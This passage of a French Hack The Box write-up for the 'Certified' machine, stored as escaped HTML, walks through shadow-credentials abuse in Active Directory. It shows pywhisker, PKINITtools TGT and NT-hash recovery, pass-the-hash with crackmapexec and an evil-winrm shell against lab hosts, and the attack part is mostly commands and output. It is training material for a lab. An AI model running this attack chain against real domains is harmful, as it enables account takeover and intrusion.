+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Must&lt;/span> &lt;span class="nx">be&lt;/span> &lt;span class="nx">used&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">c2U4qtZsMkLNEedx4nFb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">A&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">can&lt;/span> &lt;span class="nx">now&lt;/span> &lt;span class="nx">be&lt;/span> &lt;span class="nx">obtained&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//github.com/dirkjanm/PKINITtools&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Ensuite, nous obtenons un TGT pour &lt;em>management_svc&lt;/em> et le NT hash en utilisant PKINITtools.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
+&lt;/span>&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">21
+&lt;/span>&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">gettgtpkinit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">management_svc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">cert&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">pfx&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="nx">JZGbAPu&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">pfx&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">pass&lt;/span> &lt;span class="nx">c2U4qtZsMkLNEedx4nFb&lt;/span> &lt;span class="nx">management_svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ccache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">01&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mo">044&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">Loading&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">Loading&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">01&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">082&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">TGT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">TGT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">01&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">138&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">AS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">REP&lt;/span> &lt;span class="nx">encryption&lt;/span> &lt;span class="nf">key&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">you&lt;/span> &lt;span class="nx">might&lt;/span> &lt;span class="nx">need&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">later&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">AS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">REP&lt;/span> &lt;span class="nx">encryption&lt;/span> &lt;span class="nf">key&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">you&lt;/span> &lt;span class="nx">might&lt;/span> &lt;span class="nx">need&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">later&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">01&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">138&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="mi">37&lt;/span>&lt;span class="nx">b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">37&lt;/span>&lt;span class="nx">b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">01&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">42&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">141&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">Saved&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">KRB5CCNAME&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">management_svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ccache&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">getnthash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">management_svc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="mi">37&lt;/span>&lt;span class="nx">b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Impacket&lt;/span> &lt;span class="nx">v0&lt;/span>&lt;span class="mf">.12.0&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">Copyright&lt;/span> &lt;span class="nx">Fortra&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">LLC&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">its&lt;/span> &lt;span class="nx">affiliated&lt;/span> &lt;span class="nx">companies&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Using&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">ticket&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">self&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">PAC&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Recovered&lt;/span> &lt;span class="nx">NT&lt;/span> &lt;span class="nx">Hash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">crackmapexec&lt;/span> &lt;span class="nx">smb&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="s">&amp;#34;management_svc&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">H&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">SMB&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">445&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Windows&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="nx">Server&lt;/span> &lt;span class="mi">2019&lt;/span> &lt;span class="nx">Build&lt;/span> &lt;span class="mi">17763&lt;/span> &lt;span class="nf">x64&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">domain&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">signing&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">True&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">SMBv1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">False&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">SMB&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">445&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">management_svc&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Ensuite, nous pouvons utiliser evil-winrm pour obtenir un shell sur la machine via l&amp;rsquo;utilisateur &lt;em>management_svc&lt;/em>.
+Même si le port n&amp;rsquo;est pas indiqué comme ouvert sur le scan initial de nmap, il est ouvert.&lt;br>
+Finalement, nous pouvons récupérer le hash pour la partie utilisateur.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">winrm&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">management_svc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">H&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>&lt;span class="nx">Evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">WinRM&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">PS&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">management_svc&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Desktop&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">dir&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Mode&lt;/span> &lt;span class="nx">LastWriteTime&lt;/span> &lt;span class="nx">Length&lt;/span> &lt;span class="nx">Name&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">----&lt;/span> &lt;span class="o">-------------&lt;/span> &lt;span class="o">------&lt;/span> &lt;span class="o">----&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">ar&lt;/span>&lt;span class="o">---&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span> &lt;span class="nx">PM&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="root">Root
+&lt;/h2>&lt;h3 id="management_svc---ca_operator">management_svc -&amp;gt; ca_operator
+&lt;/h3>&lt;p>Maintenant que &lt;em>management_svc&lt;/em> est compromis, nous pouvons observer dans BloodHound que &lt;em>ca_operator&lt;/em> peut aussi être compromis en utilisant la même technique abusant cette fois-ci de la permission &lt;code>GenericAll&lt;/code> que &lt;em>management_svc&lt;/em> a sur &lt;em>ca_operator&lt;/em>.
+&lt;img src="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_ca_operator.png"
+width="1258"
+height="166"
+srcset="https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_ca_operator_hu_d2111b71a4a65c40.png 480w, https://01MI.github.io/p/certified-htb-writeup-windows-medium/BH_ca_operator_hu_3ed8afda0e4a0e30.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="757"
+data-flex-basis="1818px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
+&lt;/span>&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">29
+&lt;/span>&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">pywhisker&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="s">&amp;#34;certified.htb&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="s">&amp;#34;management_svc&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">H&lt;/span> &lt;span class="s">&amp;#34;a&amp;lt;...&amp;gt;4&amp;#34;&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">target&lt;/span> &lt;span class="s">&amp;#34;ca_operator&amp;#34;&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">action&lt;/span> &lt;span class="s">&amp;#34;add&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Searching&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">target&lt;/span> &lt;span class="nx">account&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Target&lt;/span> &lt;span class="nx">user&lt;/span> &lt;span class="nx">found&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">CN&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">operator&lt;/span> &lt;span class="nx">ca&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">CN&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">DC&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">DC&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Generating&lt;/span> &lt;span class="nx">certificate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Certificate&lt;/span> &lt;span class="nx">generated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Generating&lt;/span> &lt;span class="nx">KeyCredential&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">KeyCredential&lt;/span> &lt;span class="nx">generated&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">DeviceID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">174934&lt;/span>&lt;span class="nx">b2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1249&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">c39a&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">bc89&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">b4b5c01b784&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Updating&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">msDS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">KeyCredentialLink&lt;/span> &lt;span class="nx">attribute&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">ca_operator&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Updated&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">msDS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">KeyCredentialLink&lt;/span> &lt;span class="nx">attribute&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">target&lt;/span> &lt;span class="nx">object&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Converting&lt;/span> &lt;span class="nx">PEM&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">PFX&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">cryptography&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">zlax30FB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">PFX&lt;/span> &lt;span class="nx">exportiert&lt;/span> &lt;span class="nx">nach&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">zlax30FB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Passwort&lt;/span> &lt;span class="nx">für&lt;/span> &lt;span class="nx">PFX&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">CiktaI0YO7y9IV9T9mnM&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nf">PFX&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="nx">PKCS12&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">at&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">zlax30FB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Must&lt;/span> &lt;span class="nx">be&lt;/span> &lt;span class="nx">used&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">CiktaI0YO7y9IV9T9mnM&lt;/span>
